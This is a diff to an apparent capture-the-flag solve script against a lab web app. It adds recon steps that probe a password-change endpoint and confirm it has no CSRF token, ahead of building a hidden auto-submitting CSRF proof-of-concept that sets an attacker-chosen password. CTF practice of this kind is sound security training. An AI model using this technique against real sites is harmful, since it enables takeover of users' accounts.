@@ -45,6 +45,16 @@ def main():
     r = s.get(f"{BASE}/masquerade/op3/dashboard")
     print(f"    ticket queue reachable: {r.status_code == 200}, flag present: {'R6S{' in r.text} (expected: False)")
 
+    print("\n[*] Recon -- using the dashboard's OWN legitimate 'Account Settings' form on")
+    print("    ourselves first, exactly like capturing it in Burp/DevTools would: this is how")
+    print("    the real field names and endpoint below were actually learned, not guessed.")
+    recon_pw = "JustProbingMyOwnAccount1!"
+    r0 = s.post(f"{BASE}/masquerade/op3/ticket/?p=process_change_password&id=1",
+                data={"new_password": recon_pw, "confirm_password": recon_pw, "submit": "Change Password"})
+    print(f"    our own password-change succeeded: {r0.url.endswith('/dashboard')}")
+    print("    -> confirms: POST, ?p=process_change_password&id=1, fields new_password/")
+    print("       confirm_password/submit, and -- checked separately -- no CSRF token anywhere")
+
     chosen_password = "PwnedByYing123!"
     print(f"\n[*] Crafting a real CSRF PoC -- hidden auto-submit form, password we choose: {chosen_password!r}")
     poc_html = build_poc(chosen_password)
